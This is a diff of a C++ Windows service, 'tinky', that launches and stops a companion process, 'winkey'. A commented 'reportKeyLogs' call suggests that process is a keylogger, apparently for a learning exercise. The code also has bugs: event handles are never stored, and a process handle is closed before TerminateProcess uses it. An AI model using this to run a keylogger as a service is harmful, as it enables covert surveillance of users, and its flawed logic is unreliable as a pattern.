@@ -5,35 +5,6 @@ using namespace std;
 
 extern tinky_t tinky;
 
-/* subject ControlService() ? */
-/* https://learn.microsoft.com/fr-fr/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex */
-DWORD WINAPI handlerFunctionEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
-	// TODO s
-	// Handle SERVICE_CONTROL_PAUSE ?
-	// Handle SERVICE_CONTROL_SHUTDOWN !
-	// Handle SERVICE_CONTROL_STOP !
-	// Handle SERVICE_CONTROL_SESSIONCHANGE !
-	switch(dwControl) {
-		case (SERVICE_CONTROL_INTERROGATE):
-			return (NO_ERROR);
-		case (SERVICE_CONTROL_STOP):
-			SetEvent(tinky.tinkyStopEventHandle);
-			SetEvent(tinky.winkeyStopEventHandle);
-			return (NO_ERROR);
-	}
-	(void)dwEventType; // Event type, handle only if dwControl == SERVICE_CONTROL_SESSIONCHANGE
-	(void)lpEventData; // Same as above
-	(void)lpContext; // Same as RegisterServiceCtrlHandlerEx lpContext (void* user data)
-	return (ERROR_CALL_NOT_IMPLEMENTED);
-}
-
-static void registerServiceHandler(void) {
-	tinky.svcStatusHandle = RegisterServiceCtrlHandlerExA(
-				SVC_NAME,
-				&handlerFunctionEx,
-				NULL
-			);
-}
 
 static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
 	tinky.svcStatus.dwCurrentState = currentState;
@@ -42,24 +13,61 @@ static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
 	SetServiceStatus(tinky.svcStatusHandle, &tinky.svcStatus);
 }
 
-static void createSignal(void) {
-	SECURITY_ATTRIBUTES secAttribute = {
-		sizeof(SECURITY_ATTRIBUTES),
-		NULL,
-		FALSE
-	};
+static void stopTinkyWinkey(void) {
+	SetEvent(tinky.tinkyStopEventHandle);
+	SetEvent(tinky.winkeyStopEventHandle);
+	if (tinky.processInfo.hProcess)
+		CloseHandle(tinky.processInfo.hProcess);
+	if (tinky.processInfo.hThread)
+		CloseHandle(tinky.processInfo.hThread);
+	if (!TerminateProcess(tinky.processInfo.hProcess, NONE)) {
+		char buffer[16] = {};
+		itoa((int)GetLastError(), buffer, 16);
+		journalReport(string (string("Terminate process failed with code:") + string(buffer) + string("\n")).c_str());
+	}
+	sendStatus(SERVICE_STOPPED, NONE);
+}
 
-	tinky.winkeyStopEventHandle = CreateEventA(
-		&secAttribute,
+/* https://learn.microsoft.com/fr-fr/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex */
+DWORD WINAPI controlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
+	// TODO s
+	// Handle SERVICE_CONTROL_PAUSE ?
+	// Handle SERVICE_CONTROL_SESSIONCHANGE !
+	switch(dwControl) {
+		case (SERVICE_CONTROL_INTERROGATE):
+			return (NO_ERROR);
+		case (SERVICE_CONTROL_STOP):
+			stopTinkyWinkey();
+			return (NO_ERROR);
+		case (SERVICE_CONTROL_SHUTDOWN):
+			//reportKeyLogs();
+			stopTinkyWinkey();
+			return (NO_ERROR);
+	}
+	(void)dwEventType; // Event type, handle only if dwControl == SERVICE_CONTROL_SESSIONCHANGE
+	(void)lpEventData; // Same as above
+	(void)lpContext; // Same as RegisterServiceCtrlHandlerEx lpContext (void* user data)
+	return (ERROR_CALL_NOT_IMPLEMENTED);
+}
+
+static void registerControlHandler(void) {
+	tinky.svcStatusHandle = RegisterServiceCtrlHandlerExA(
+				SVC_NAME,
+				&controlHandler,
+				NULL
+			);
+}
+
+static void createEvent(HANDLE handle, const char *eventName) {
+	handle = CreateEventA(
+		NULL,
 		FALSE,
 		FALSE,
-		WINKEY_STOP
+		eventName
 	);
 }
 
 static BYTE launchProcess(const char *processPath) {
-	createSignal();
-
 	if (!CreateProcessA(
 		processPath, // GetCurrentDirectory() ?
 		NULL,
@@ -71,44 +79,24 @@ static BYTE launchProcess(const char *processPath) {
 	)) {
 		journalReport("Service failed to launch\n");
 		return (FAILURE);
-		//WaitForSingleObject(pi.hProcess, INFINITE);
-
-		//CloseHandle(pi.hProcess);
-		//CloseHandle(pi.hThread);
 	}
 	journalReport("Process launched\n");
 	return (SUCCESS);
 }
 
-static BYTE createSvcStopEvent(void) {
-	tinky.tinkyStopEventHandle = CreateEvent(
-		NULL,
-		TRUE,
-		FALSE,
-		NULL
-	);
-	if (!tinky.tinkyStopEventHandle) {
-		journalReport("Failed to create stop event for tinky\n");
-		return (FAILURE);
-	}
-	return (SUCCESS);
-}
-
-static BYTE initSvc(void) {
-	registerServiceHandler();
+static BYTE initService(void) {
+	registerControlHandler();
 	tinky.svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
 	sendStatus(SERVICE_START_PENDING, NONE);
 
-	if (!createSvcStopEvent()) {
-		sendStatus(SERVICE_STOPPED, NONE);
-		return (FAILURE);
-	}
+	createEvent(tinky.winkeyStopEventHandle, WINKEY_STOP);
+	createEvent(tinky.tinkyStopEventHandle, NO_NAME);
 	return (SUCCESS);
 }
 
 /* WINAPI ServiceMain() */
 VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors) {
-	if (!initSvc())
+	if (!initService())
 		return ;
 
 	if (!launchProcess(WINKEY_PATH)) {
@@ -118,14 +106,14 @@ VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors) {
 
 	} else {
 
-		journalReport("Entering main loop\n");
 		sendStatus(SERVICE_RUNNING, SERVICE_ACCEPT_STOP);
 
 		while (true) {
+
 			WaitForSingleObject(tinky.tinkyStopEventHandle, INFINITE);
 			journalReport(string("Process tinky stop event\n").c_str());
-			sendStatus(SERVICE_STOPPED, NONE);
-			return ; // Useless loop ?
+			return ;
+
 		}
 	}
 	(void)dwNumServicesArgs, (void)lpServiceArgVectors;
